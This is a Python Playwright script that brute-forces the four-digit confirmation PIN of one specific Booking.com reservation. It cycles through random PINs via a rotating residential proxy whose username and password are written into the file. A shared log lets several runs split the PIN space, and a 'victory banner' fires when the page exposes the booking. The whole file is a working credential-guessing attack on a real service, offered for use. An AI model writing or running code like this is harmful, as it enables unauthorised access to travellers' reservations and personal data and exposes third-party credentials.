#!/usr/bin/env python3
"""
TARGET PIN HUNTER - Booking ID: 5727559423
Each agent does exactly 10 attempts, then returns home if failed
If successful, displays victory banner and stops all processes
"""

from playwright.sync_api import sync_playwright
import os
import time
import random
import json
import sys
import threading
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Configuration
TARGET_BOOKING_ID = "5727559423"
AGENT_NAME = "TARGET_HUNTER"
HEADLESS = False  # Show browser for testing
WAIT_TIME = 5  # seconds between attempts
ATTEMPTS_PER_AGENT = 10  # Each agent does exactly 10 attempts
SCREEN_DIR = "screenshots_target"
SUCCESS_FILE = f"TARGET_SUCCESS_{TARGET_BOOKING_ID}.json"
GLOBAL_LOG_FILE = f"target_hunt_log_{TARGET_BOOKING_ID}.txt"

# Proxy configuration
PROXY_CONFIG = {
    "server": "http://us-pr.oxylabs.io:10000",
    "username": "customer-phantomnet1_ONP6z",
    "password": "phantomnet1_ONP6z"
}

# Thread-safe PIN management
class TargetPinManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.used_pins = self._load_used_pins()
        self.success_found = self._check_success()
    
    def _load_used_pins(self):
        """Load already tried PINs"""
        used_pins = set()
        if os.path.exists(GLOBAL_LOG_FILE):
            try:
                with open(GLOBAL_LOG_FILE, 'r', encoding='utf-8') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        if len(parts) >= 4:
                            used_pins.add(parts[3])
            except:
                pass
        return used_pins
    
    def _check_success(self):
        """Check if success already found"""
        return os.path.exists(SUCCESS_FILE)
    
    def get_next_pin(self, agent_name):
        """Get next available PIN for agent"""
        with self.lock:
            if self.success_found:
                return None
            
            # Generate random PIN not in used list
            max_attempts = 100
            for _ in range(max_attempts):
                pin = f"{random.randint(0, 9999):04d}"
                if pin not in self.used_pins:
                    self.used_pins.add(pin)
                    return pin
            
            return None
    
    def record_result(self, agent_name, pin, result, url, attempt_num):
        """Record PIN attempt result"""
        with self.lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"{timestamp},{TARGET_BOOKING_ID},{agent_name},{pin},{result},{url},attempt_{attempt_num}\n"
            
            # Write to log file
            with open(GLOBAL_LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            # If success, record it and trigger victory
            if result == 'SUCCESS':
                self.success_found = True
                success_data = {
                    'success_pin': pin,
                    'agent': agent_name,
                    'booking_id': TARGET_BOOKING_ID,
                    'timestamp': timestamp,
                    'attempt_number': attempt_num,
                    'url': url
                }
                with open(SUCCESS_FILE, 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                self.display_victory_banner(pin, agent_name, attempt_num)
                return True
            
            return False
    
    def display_victory_banner(self, pin, agent_name, attempt_num):
        """Display victory banner"""
        banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                          🎉 VICTORY ACHIEVED! 🎉                            ║
║                                                                              ║
║  Target Booking ID: {TARGET_BOOKING_ID}                                      ║
║  Winning PIN: {pin}                                                        ║
║  Agent: {agent_name}                                                         ║
║  Attempt Number: {attempt_num}                                               ║
║  Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                  ║
║                                                                              ║
║                      🚀 MISSION ACCOMPLISHED! 🚀                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)

# Create directories
os.makedirs(SCREEN_DIR, exist_ok=True)

def test_single_pin(pin, attempt_num, agent_name, pin_manager):
    """Test a single PIN - returns True if successful"""
    try:
        print(f"{Fore.YELLOW}[{agent_name}] Attempt {attempt_num}/10 - Testing PIN: {pin}{Style.RESET_ALL}")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=HEADLESS, proxy=PROXY_CONFIG)
            page = browser.new_page()

            try:
                # Navigate to booking confirmation page
                page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load", timeout=30000)

                # Fill in booking ID and PIN
                page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
                page.fill('input[placeholder="e.g. 1234567890"]', TARGET_BOOKING_ID)
                page.fill('input[placeholder="e.g. 1234"]', pin)

                # Click Continue button
                try:
                    page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                    page.click('button:has-text("Continue")')
                except Exception:
                    page.wait_for_selector('button[type="submit"]', timeout=5000)
                    page.click('button[type="submit"]')

                # Wait for result
                page.wait_for_function(
                    """
                    () => {
                        return location.href.includes('unique_order_id') ||
                               document.querySelector('.bui-alert--error') !== null
                    }
                    """,
                    timeout=30000
                )

                current_url = page.url
                
                if "unique_order_id=" in current_url:
                    # SUCCESS!
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_SUCCESS.png")
                    pin_manager.record_result(agent_name, pin, 'SUCCESS', current_url, attempt_num)
                    print(f"{Fore.GREEN}🎉 SUCCESS! PIN {pin} is correct!{Style.RESET_ALL}")
                    return True
                    
                elif page.query_selector('.bui-alert--error'):
                    # Failed
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_FAIL.png")
                    pin_manager.record_result(agent_name, pin, 'FAILURE', current_url, attempt_num)
                    print(f"{Fore.RED}❌ PIN {pin} failed{Style.RESET_ALL}")
                    return False
                    
                else:
                    # Unknown result
                    page.screenshot(path=f"{SCREEN_DIR}/{TARGET_BOOKING_ID}_{pin}_UNKNOWN.png")
                    pin_manager.record_result(agent_name, pin, 'UNKNOWN', current_url, attempt_num)
                    print(f"{Fore.YELLOW}❓ PIN {pin} - unknown result{Style.RESET_ALL}")
                    return False
                    
            finally:
                browser.close()
                
    except Exception as e:
        error_msg = f'EXCEPTION: {str(e)[:200]}'
        pin_manager.record_result(agent_name, pin, error_msg, 'N/A', attempt_num)
        print(f"{Fore.RED}💥 Exception testing PIN {pin}: {str(e)[:100]}{Style.RESET_ALL}")
        return False

def main():
    """Main function - Agent does exactly 10 attempts"""
    pin_manager = TargetPinManager()
    
    # Check if success already found
    if pin_manager.success_found:
        try:
            with open(SUCCESS_FILE, 'r') as f:
                success_data = json.load(f)
            print(f"{Fore.GREEN}✅ SUCCESS ALREADY FOUND!")
            print(f"PIN: {success_data['success_pin']}")
            print(f"Agent: {success_data['agent']}")
            print(f"Attempt: {success_data['attempt_number']}{Style.RESET_ALL}")
            return
        except:
            pass
    
    # Display startup banner
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                      🎯 TARGET PIN HUNTER STARTING 🎯                        ║
║                                                                              ║
║  Target Booking ID: {TARGET_BOOKING_ID}                                      ║
║  Agent: {AGENT_NAME}                                                         ║
║  Attempts per agent: {ATTEMPTS_PER_AGENT}                                    ║
║  Wait time: {WAIT_TIME} seconds                                              ║
║  PIN Range: 0000-9999                                                       ║
║                                                                              ║
║                        🚀 MISSION STARTING! 🚀                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # Start hunting - exactly 10 attempts
    for attempt in range(1, ATTEMPTS_PER_AGENT + 1):
        # Check if another agent found success
        if pin_manager.success_found:
            print(f"{Fore.GREEN}🎉 SUCCESS FOUND BY ANOTHER AGENT! Stopping.{Style.RESET_ALL}")
            break
        
        # Get next PIN
        pin = pin_manager.get_next_pin(AGENT_NAME)
        if pin is None:
            print(f"{Fore.RED}❌ No more available PINs or success found{Style.RESET_ALL}")
            break
        
        # Test the PIN
        if test_single_pin(pin, attempt, AGENT_NAME, pin_manager):
            # Success found - stop immediately
            break
        
        # Wait before next attempt (except last attempt)
        if attempt < ATTEMPTS_PER_AGENT:
            print(f"{Fore.BLUE}⏱️ Waiting {WAIT_TIME} seconds before next attempt...{Style.RESET_ALL}")
            time.sleep(WAIT_TIME)
    
    # Return home message
    if not pin_manager.success_found:
        print(f"""
{Fore.YELLOW}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                        🏠 RETURNING HOME 🏠                                  ║
║                                                                              ║
║  Agent: {AGENT_NAME}                                                         ║
║  Attempts made: {min(attempt, ATTEMPTS_PER_AGENT)}                           ║
║  Status: No success, mission continues...                                   ║
║                                                                              ║
║  Another agent will take over the hunt!                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    # Final stats
    stats = {
        'total_attempts': len(pin_manager.used_pins),
        'success_found': pin_manager.success_found,
        'agent_attempts': attempt if 'attempt' in locals() else 0
    }
    
    print(f"{Fore.CYAN}📊 SESSION STATS:")
    print(f"Total PINs tried (all agents): {stats['total_attempts']}")
    print(f"This agent's attempts: {stats['agent_attempts']}")
    print(f"Success found: {'YES' if stats['success_found'] else 'NO'}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
